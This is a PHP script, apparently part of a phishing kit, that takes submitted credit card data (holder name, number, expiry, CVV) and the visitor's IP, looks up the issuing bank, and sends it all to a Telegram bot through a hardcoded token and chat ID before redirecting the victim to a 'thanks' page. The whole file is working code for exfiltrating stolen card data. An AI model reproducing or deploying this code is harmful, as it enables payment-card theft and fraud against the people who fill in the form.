<?php
include "anti/getip.php";
include "id.php";
if(isset($_POST['wala2'])){
$ip = getenv("REMOTE_ADDR");
$bin        = str_replace(' ', '', $_POST['ccnumb']);
$bin        = substr($bin, 0, 6);
$getdetails = 'https://lookup.binlist.net/' . $bin;
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$_SESSION['_namebank_'] = $namebank   = $details->bank->name;
$message = "±±±±±±±±±±±±[ MAFAKEN CCV ]±±±±±±±±±±±±\n• cc holdername: ".$_POST['ccholder']." \n• ccnumber  : ".$_POST['ccnumb']." (".$_SESSION['_namebank_'].")\n• EXPDATE : ".$_POST['exm']." / ".$_POST['exy']."\n• cvv : ".$_POST['cvvz']."\n•IP      : ".$requester_IP."\n±±±±±±±±±±±±[ MAFAKEN CCV ]±±±±±±±±±±±±\n";
###########
$token = "1302432915:AAHIh7JFVX3vOTOs5MvMtYbO3mJVeShoecQ";
$data = [
    'text' => $message,
    'chat_id' => '1096335592'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
##########
if ($sms=='1'){
HEADER("Location: gateway/dist/process?country=USA&hash=N/A?userid=59021");
}else{
HEADER("Location: thanks.php");
}
}
?>